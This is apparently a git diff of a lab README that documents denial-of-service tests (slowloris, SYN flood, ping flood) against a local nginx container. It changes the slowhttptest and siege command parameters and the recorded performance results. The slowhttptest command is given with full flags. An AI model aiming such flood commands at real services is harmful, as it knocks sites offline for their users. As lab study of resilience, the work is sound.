@@ -34,7 +34,7 @@ used [siege](https://www.kali.org/tools/siege/)
 ## Slowloris attack
 used Kali package [slowhttptest](https://www.kali.org/tools/slowhttptest/)
 ```
-    $ slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://nginx:8080 -x 24 -p 3
+    $ slowhttptest -c 1050 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://nginx:8080 -x 24 -p 3
 ```
 
 ## Syn flood
@@ -54,22 +54,22 @@ used [fping](https://www.kali.org/tools/fping/)
 
 Following command used to determine health of our application
 ```
-    $ siege -d1 -c50 -t60s http://localhost:8080
+    $ siege -d1 -c200 -t120s http://localhost:8080
 ```
 Example normal report
 ```
-Transactions:		        5831 hits
+Transactions:		       23191 hits
 Availability:		      100.00 %
-Elapsed time:		       59.38 secs
-Data transferred:	        0.01 MB
-Response time:		        0.01 secs
-Transaction rate:	       98.20 trans/sec
+Elapsed time:		      119.27 secs
+Data transferred:	        0.04 MB
+Response time:		        1.02 secs
+Transaction rate:	      194.44 trans/sec
 Throughput:		        0.00 MB/sec
-Concurrency:		        0.90
-Successful transactions:        5831
+Concurrency:		      198.96
+Successful transactions:       23191
 Failed transactions:	           0
-Longest transaction:	        0.16
-Shortest transaction:	        0.00
+Longest transaction:	        1.81
+Shortest transaction:	        0.09
 ```
 
 Also we'll monitor docker stats using [TIG stack](https://hackmd.io/@lnu-iot/tig-stack)
@@ -87,18 +87,18 @@ The only thing we can track is increased amount of incomming traffic to nginx co
 
 This attack doesn't seem to work on nginx:1.21. Since our `siege` command reports normal results:
 ```
-Transactions:		        5866 hits
+Transactions:		       65207 hits
 Availability:		      100.00 %
-Elapsed time:		       59.32 secs
-Data transferred:	        0.01 MB
-Response time:		        0.00 secs
-Transaction rate:	       98.89 trans/sec
+Elapsed time:		      119.72 secs
+Data transferred:	        0.12 MB
+Response time:		        0.37 secs
+Transaction rate:	      544.66 trans/sec
 Throughput:		        0.00 MB/sec
-Concurrency:		        0.37
-Successful transactions:        5866
+Concurrency:		      199.47
+Successful transactions:       65207
 Failed transactions:	           0
-Longest transaction:	        0.11
-Shortest transaction:	        0.00
+Longest transaction:	        1.40
+Shortest transaction:	        0.01
 ```
 We can only observe increase traffic on nginx container:
 ![Screenshot from 2022-01-03 18-35-30](https://user-images.githubusercontent.com/19594637/147955909-0c201d5c-0cc0-4139-986a-9d0f87fbc552.png)
@@ -108,18 +108,18 @@ We can only observe increase traffic on nginx container:
 
 Using one kali linux container the only thing I could achieve is to siginficantly increase response times of the application:
 ```
-Transactions:		        2897 hits
+Transactions:		       16393 hits
 Availability:		      100.00 %
-Elapsed time:		       59.32 secs
-Data transferred:	        0.01 MB
-Response time:		        0.52 secs
-Transaction rate:	       48.84 trans/sec
+Elapsed time:		      119.19 secs
+Data transferred:	        0.03 MB
+Response time:		        1.45 secs
+Transaction rate:	      137.54 trans/sec
 Throughput:		        0.00 MB/sec
-Concurrency:		       25.59
-Successful transactions:        2897
+Concurrency:		      198.89
+Successful transactions:       16393
 Failed transactions:	           0
-Longest transaction:	       14.40
-Shortest transaction:	        0.09
+Longest transaction:	        3.50
+Shortest transaction:	        0.01
 ```
 Also we can observe increase CPU and traffic on our nginx container:
 ![Screenshot from 2022-01-03 18-58-40](https://user-images.githubusercontent.com/19594637/147958096-40632afc-3a05-4c6c-bd23-6d0bdfe4923e.png)
@@ -143,18 +143,17 @@ And our siege command results show us that our application was unable to server 
 siege aborted due to excessive socket failure; you
 can change the failure threshold in $HOME/.siegerc
 
-Transactions:		         512 hits
-Availability:		       33.33 %
-Elapsed time:		       16.26 secs
+Transactions:		        2195 hits
+Availability:		       64.54 %
+Elapsed time:		        9.96 secs
 Data transferred:	        0.00 MB
-Response time:		        0.02 secs
-Transaction rate:	       31.49 trans/sec
+Response time:		        0.81 secs
+Transaction rate:	      220.38 trans/sec
 Throughput:		        0.00 MB/sec
-Concurrency:		        0.65
-Successful transactions:         512
-Failed transactions:	        1024
-Longest transaction:	        0.07
-Shortest transaction:	        0.00
+Concurrency:		      178.48
+Successful transactions:        2195
+Failed transactions:	        1206
+Longest transaction:	        1.50
 ```
 What is really dangerous about this kind of attack is that it does not seems to be easy to track using metrics (the only spike for nginx container is RAM)
 ![Screenshot from 2022-01-03 18-11-12](https://user-images.githubusercontent.com/19594637/147953506-abca9fc6-685f-4faf-9e31-4055c1146df2.png)
